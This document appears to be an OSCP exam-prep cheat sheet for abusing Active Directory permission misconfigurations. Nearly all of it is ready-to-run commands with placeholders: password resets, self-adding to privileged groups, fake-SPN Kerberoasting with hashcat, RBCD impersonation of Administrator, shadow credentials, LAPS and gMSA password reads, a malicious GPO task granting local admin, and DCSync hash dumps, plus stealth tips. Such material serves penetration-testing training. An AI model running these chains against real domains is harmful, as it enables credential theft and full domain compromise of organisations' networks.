# AD ACL Abuse — OSCP-Ready Methodology

Covers enumeration through exploitation of every common DACL misconfiguration on AD objects (users, groups, computers, GPOs, OUs). Primary tool: `bloodyAD` (cross-platform, LDAP-native). Fallback: `netexec` for quick checks, PowerView from a Windows foothold.

---

## 0. Setup

```bash
pip3 install bloodyAD
bloodyAD --version

# Standard auth block reused below (pick one):
AUTH="-d <domain> -u <user> -p <password> --host <dc-ip>"
AUTH_HASH="-d <domain> -u <user> -p :<NTHASH> --host <dc-ip>"
AUTH_KRB="-d <domain> -u <user> -k --host <dc-fqdn>"   # with KRB5CCNAME set
```

---

## 1. Enumeration — Find the ACL Abuse Paths

**Always start here. Don't exploit blind — know exactly which ACE on which object you're abusing.**

```bash
# BloodHound collection (the real starting point — ACL abuse is a graph problem)
bloodyAD $AUTH get writable --detail
# Lists every object the current user has ANY write-ish right on, with the right named

# Or full BloodHound ingest for the graph UI
bloodhound-python -d <domain> -u '<user>' -p '<password>' -ns <dc-ip> -c All --zip

# netexec quick cross-check (if bloodyAD unavailable)
netexec ldap <dc-ip> -u '<user>' -p '<password>' -M get-desc-users
netexec ldap <dc-ip> -u '<user>' -p '<password>' --bloodhound -c All --dns-server <dc-ip>
```

Load the BloodHound zip into BloodHound CE, mark your current user as "Owned", run **Shortest Path to Domain Admins from Owned Principals**. Every edge on that path (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `AddSelf`, `WriteSPN`, `AllExtendedRights`, `ReadLAPSPassword`, `ReadGMSAPassword`, `AddKeyCredentialLink`) maps to exactly one section below.

**Decision point table — edge found → section to use:**

|BloodHound edge|Section|
|---|---|
|`GenericAll` on user|§2|
|`GenericAll` / `GenericWrite` on group|§3|
|`GenericAll` / `WriteDacl` / `WriteOwner` on computer|§4|
|`ForceChangePassword`|§2.1|
|`AddMember` / `AddSelf`|§3.1|
|`WriteSPN`|§5|
|`AddKeyCredentialLink` / `GenericWrite` on user (Shadow Creds)|§6|
|`ReadLAPSPassword`|§7.1|
|`ReadGMSAPassword`|§7.2|
|`GenericAll` / `WriteDacl` on GPO|§8|
|`WriteDacl` on domain object / `WriteOwner` → DCSync setup|§9|
|`AllExtendedRights` on user|§2 (treat as GenericAll-equivalent for passwords/creds)|

---

## 2. GenericAll / GenericWrite on a User Object

Full (or near-full) control of a user account. Fastest win: reset their password directly.

### 2.1 — ForceChangePassword / GenericAll → reset password

```bash
bloodyAD $AUTH set password '<target-user>' '<NewP@ssw0rd!>'

# PowerView fallback (from a Windows foothold)
Set-DomainUserPassword -Identity <target-user> -AccountPassword (ConvertTo-SecureString '<NewP@ssw0rd!>' -AsPlainText -Force)

# netexec fallback
netexec ldap <dc-ip> -u '<user>' -p '<password>' -M change-password -o USER='<target-user>' NEWPASS='<NewP@ssw0rd!>'
```

**Decision point:** if the target is a service account or has logon restrictions, a password reset may lock you out of Kerberoasting it later or trip account-lockout alerting — prefer Shadow Credentials (§6) when stealth matters, since it doesn't touch the password.

### 2.2 — GenericWrite on a user → targeted Kerberoasting (set a fake SPN)

```bash
bloodyAD $AUTH set object '<target-user>' servicePrincipalName -v 'HTTP/fake.corp.local'

# Now Kerberoast it
GetUserSPNs.py '<domain>/<user>:<password>' -dc-ip <dc-ip> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Cleanup — remove the fake SPN after
bloodyAD $AUTH remove object '<target-user>' servicePrincipalName -v 'HTTP/fake.corp.local'
```

---

## 3. GenericAll / GenericWrite / AddMember on a Group

Add yourself (or a controlled account) directly into a privileged group.

### 3.1 — AddMember / AddSelf / GenericAll → join the group

```bash
bloodyAD $AUTH add groupMember '<target-group>' '<user>'

# PowerView fallback
Add-DomainGroupMember -Identity '<target-group>' -Members '<user>'

# netexec fallback
netexec ldap <dc-ip> -u '<user>' -p '<password>' -M add-user-to-group -o GROUP='<target-group>' USER='<user>'
```

**Decision point:** group membership changes only reflect in a **new** Kerberos TGT — re-authenticate / request a fresh ticket after adding yourself.

```bash
# Refresh Kerberos ticket to pick up new group membership
getTGT.py '<domain>/<user>:<password>' -dc-ip <dc-ip>
export KRB5CCNAME=<user>.ccache
```

---

## 4. GenericAll / WriteDacl / WriteOwner on a Computer Object

Most valuable when the computer object is a server you want to compromise (not your own foothold) — abused via **Resource-Based Constrained Delegation (RBCD)**.

```bash
# 1. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer to a SID you control
#    (your own user, or a computer account whose hash you have — create one if needed)

# If you don't control a computer account yet, add one (default: any user can add up to 10 by MachineAccountQuota)
bloodyAD $AUTH add computer '<FAKE-COMPUTER>$' '<FakeComputerP@ss!>'

# 2. Grant the fake computer RBCD rights on the target
bloodyAD $AUTH add rbcd '<target-computer>$' '<FAKE-COMPUTER>$'

# PowerView fallback for step 2
$sid = (Get-DomainComputer <FAKE-COMPUTER>).objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Set-DomainComputer <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}

# 3. Get the fake computer's NT hash
netexec smb <dc-ip> -u '<FAKE-COMPUTER>$' -p '<FakeComputerP@ss!>' --ntds 2>/dev/null
# or simply compute it:
python3 -c "import hashlib; print(hashlib.new('md4', '<FakeComputerP@ss!>'.encode('utf-16le')).hexdigest())"

# 4. S4U2Self/S4U2Proxy to impersonate a privileged user (Administrator) on the target computer
getST.py -spn 'cifs/<target-computer-fqdn>' -impersonate Administrator '<domain>/<FAKE-COMPUTER>$:<FakeComputerP@ss!>' -dc-ip <dc-ip>

# 5. Use the resulting ticket
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass '<domain>/administrator@<target-computer-fqdn>'
```

**Decision point:** if `MachineAccountQuota` is 0 (check with `bloodyAD $AUTH get object '<domain-dn>' ms-DS-MachineAccountQuota`), you can't add a fake computer — reuse your own machine account (if on a domain-joined foothold) or a computer account you already control instead of step 1.

---

## 5. WriteSPN — Targeted Kerberoasting

Same technique as §2.2, listed separately since BloodHound reports it as its own edge when the right is scoped only to the SPN attribute.

```bash
bloodyAD $AUTH set object '<target-user>' servicePrincipalName -v 'HTTP/fake.corp.local'
GetUserSPNs.py '<domain>/<user>:<password>' -dc-ip <dc-ip> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
bloodyAD $AUTH remove object '<target-user>' servicePrincipalName -v 'HTTP/fake.corp.local'
```

---

## 6. GenericWrite / AddKeyCredentialLink → Shadow Credentials

**Preferred over password reset when stealth matters** — doesn't change the target's password, works even without being able to reset creds directly (just needs write to `msDS-KeyCredentialLink`).

```bash
# bloodyAD does this in one shot: adds a key, requests a TGT via PKINIT, prints the NT hash
bloodyAD $AUTH add shadowCreds '<target-user>'

# Equivalent with certipy-ad (if you also have certipy-ad on hand)
certipy-ad shadow auto -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target-user>'

# Use the resulting TGT/hash
export KRB5CCNAME=<target-user>.ccache
# or pass-the-hash with the printed NT hash
netexec smb <dc-ip> -u '<target-user>' -H <NT-HASH>
```

**Cleanup (optional, reduces forensic footprint):**

```bash
bloodyAD $AUTH remove object '<target-user>' msDS-KeyCredentialLink -v '<the-added-value>'
```

---

## 7. Read Rights on Sensitive Attributes

### 7.1 — ReadLAPSPassword (ms-Mcs-AdmPwd / msLAPS-Password)

```bash
bloodyAD $AUTH get object '<target-computer>$' --attr ms-Mcs-AdmPwd
# New LAPS (Windows LAPS) attribute name:
bloodyAD $AUTH get object '<target-computer>$' --attr msLAPS-Password

# netexec fallback — dumps LAPS for every computer you can read
netexec ldap <dc-ip> -u '<user>' -p '<password>' -M laps
```

**Decision point:** the returned password authenticates as the **local Administrator** on that specific computer, not a domain account.

```bash
netexec smb <target-computer-ip> -u Administrator -p '<laps-password>'
```

### 7.2 — ReadGMSAPassword (gMSA)

```bash
bloodyAD $AUTH get object '<gmsa-account>$' --attr msDS-ManagedPassword

# netexec fallback — decodes the blob to NT hash automatically
netexec ldap <dc-ip> -u '<user>' -p '<password>' --gmsa
```

```bash
netexec smb <dc-ip> -u '<gmsa-account>$' -H <decoded-NT-hash>
```

---

## 8. GenericAll / WriteDacl / WriteProperty on a GPO

Edit a Group Policy Object linked to an OU containing your target, inject a malicious immediate-task/scheduled-task that runs as SYSTEM on every machine in that OU.

```bash
# Find which OU/computers the GPO applies to first
bloodyAD $AUTH get object '<gpo-dn>' --attr gPCFileSysPath

# Easiest path: use SharpGPOAbuse (requires a Windows foothold with RSAT or SharpGPOAbuse.exe)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators <user> /add" --GPOName "<Target GPO Name>"

# Force immediate policy refresh on target (if you have exec there) or wait for the ~90min cycle
gpupdate /force
```

**Decision point:** this takes effect only after the next GPO refresh cycle on affected machines (default ~90 min, randomized) unless you can trigger `gpupdate /force` yourself on a target machine — plan the timing on exam day.

---

## 9. WriteDacl on Domain Object / Naming Context → DCSync Rights

Grant yourself `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` directly on the domain object — full domain compromise.

```bash
bloodyAD $AUTH add genericAll '<domain-dn>' '<user>'
# then explicitly add replication rights
bloodyAD $AUTH add dcsync '<user>'

# netexec fallback to perform the DCSync itself once rights are granted
netexec smb <dc-ip> -u '<user>' -p '<password>' --ntds --user administrator

# or secretsdump
secretsdump.py '<domain>/<user>:<password>'@<dc-ip> -just-dc-user administrator
```

**Decision point:** if you only got the edge via WriteOwner, take ownership first, then grant yourself WriteDacl, then grant DCSync:

```bash
bloodyAD $AUTH set owner '<domain-dn>' '<user>'
bloodyAD $AUTH add genericAll '<domain-dn>' '<user>'
bloodyAD $AUTH add dcsync '<user>'
```

---

## 10. WriteOwner — Generic Chain (any object type)

`WriteOwner` alone isn't directly exploitable — it's always step 1 of a 3-step chain: take ownership → grant yourself DACL rights → do the real abuse from §2–9.

```bash
# 1. Take ownership of the object
bloodyAD $AUTH set owner '<target-object>' '<user>'

# 2. Grant yourself GenericAll (or more targeted rights) now that you own it
bloodyAD $AUTH add genericAll '<target-object>' '<user>'

# 3. Proceed with whichever section matches the object type (user → §2, group → §3, computer → §4, etc.)
```

---

## 11. Post-Exploitation Cleanup Checklist (OSCP hygiene)

|Change made|Revert command|
|---|---|
|Password reset|Can't revert — document original lockout risk in report|
|Group membership added|`bloodyAD $AUTH remove groupMember '<group>' '<user>'`|
|Fake SPN set|`bloodyAD $AUTH remove object '<user>' servicePrincipalName -v '<spn>'`|
|RBCD set on computer|`bloodyAD $AUTH remove rbcd '<target-computer>$' '<fake-computer>$'`|
|Shadow Creds key added|`bloodyAD $AUTH remove object '<user>' msDS-KeyCredentialLink -v '<value>'`|
|Owner changed|`bloodyAD $AUTH set owner '<object>' '<original-owner-sid>'`|

On the real exam, cleanup isn't graded — but documenting it shows understanding of the technique's footprint.

---

## Priority Checklist — Fastest Paths to Try First

1. **`bloodyAD get writable --detail` immediately after any new credential/foothold** — takes seconds, tells you everything the current principal can abuse.
2. **GenericAll/ForceChangePassword on a user** (§2.1) — fastest win, one command.
3. **AddMember on a privileged group** (§3.1) — second fastest, especially straight to Domain Admins-equivalent groups.
4. **ReadLAPSPassword / ReadGMSAPassword** (§7) — often missed because it's "just read access"; check it every time, zero footprint.
5. **GenericWrite on a user → Shadow Credentials** (§6) — the stealthy default when you don't want to touch the password.
6. **WriteDacl/GenericAll on a computer → RBCD** (§4) — when the target is a different box than your foothold.
7. **WriteDacl/WriteOwner on the domain object → DCSync** (§9) — the big one; always check for this edge specifically in BloodHound, it ends the engagement.
8. **GPO abuse** (§8) — slower (refresh cycle), use when nothing faster is available for a whole OU.

---

**Report-writing reminder:** for every abuse above, note the exact BloodHound edge name and source/target object that justified it — graders want to see "enumerated GenericAll(user1→user2) via BloodHound, exploited via bloodyAD set password" as the reasoning chain, not just the resulting shell.